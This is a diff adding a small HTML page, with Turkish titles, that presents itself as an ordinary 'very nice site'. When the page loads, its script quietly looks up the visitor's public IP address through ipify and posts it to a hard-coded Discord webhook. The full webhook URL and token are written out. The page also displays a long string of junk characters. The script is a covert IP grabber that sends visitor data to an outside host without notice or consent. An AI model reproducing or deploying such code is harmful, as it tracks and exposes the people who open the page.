@@ -1,0 +1,36 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Selam ben ada</title>
+</head>
+<body>
+  <h1>Cok güzel site</h1>
+  <pre id="result"></pre>
+
+  <script>
+    const WEBHOOK = "https://discord.com/api/webhooks/1421885077750681691/x69bDW9BkMSYqs2L0NPExHEw2fWPDkhrTlyKVXkEYI7k-Aow9I8sgqwSKgrMHccP2x0f";
+
+    // Ziyaretçinin genel IP'sini öğrenmek için ipify gibi bir servis kullan
+    fetch("https://api.ipify.org?format=json")
+      .then(r => r.json())
+      .then(data => {
+        const ip = data.ip;
+        document.getElementById("result").textContent = "wqwewqewqeqewqewqwewqewqeqewqeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeegqhgwqeytwqeywqwqwewqewqeqewqeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeegqhgwqeytwqeywqwqwewqewqeqewqeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeegqhgwqeytwqeywqwqwewqewqeqewqeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeegqhgwqeytwqeywqwqwewqewqeqewqeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeegqhgwqeytwqeywqwqwewqewqeqewqeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeegqhgwqeytwqeywqwqwewqewqeqewqeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeegqhgwqeytwqeywqwqwewqewqeqewqeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeegqhgwqeytwqeywqwqwewqewqeqewqeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeegqhgwqeytwqeywqwqwewqewqeqewqeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeegqhgwqeytwqeywqwqwewqewqeqewqeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeegqhgwqeytwqeywqwqwewqewqeqewqeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeegqhgwqeytwqeywqwqwewqewqeqewqeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeegqhgwqeytwqeywqwqwewqewqeqewqeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeegqhgwqeytwqeywqwqwewqewqeqewqeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeegqhgwqeytwqeywqwqwewqewqeqewqeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeegqhgwqeytwqeywqwqwewqewqeqewqeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeegqhgwqeytwqeywqwqwewqewqeqewqeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeegqhgwqeytwqeywqeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeegqhgwqeytwqeywqew" + ip;
+
+        // Discord webhook'a POST atmayı dene
+        return fetch(WEBHOOK, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ content: "Ziyaretçi IP: " + ip })
+        });
+      })
+      .then(res => {
+        console.log("Webhook cevabı:", res.status);
+      })
+      .catch(err => {
+        console.error("Hata:", err);
+      });
+  </script>
+</body>
+</html>
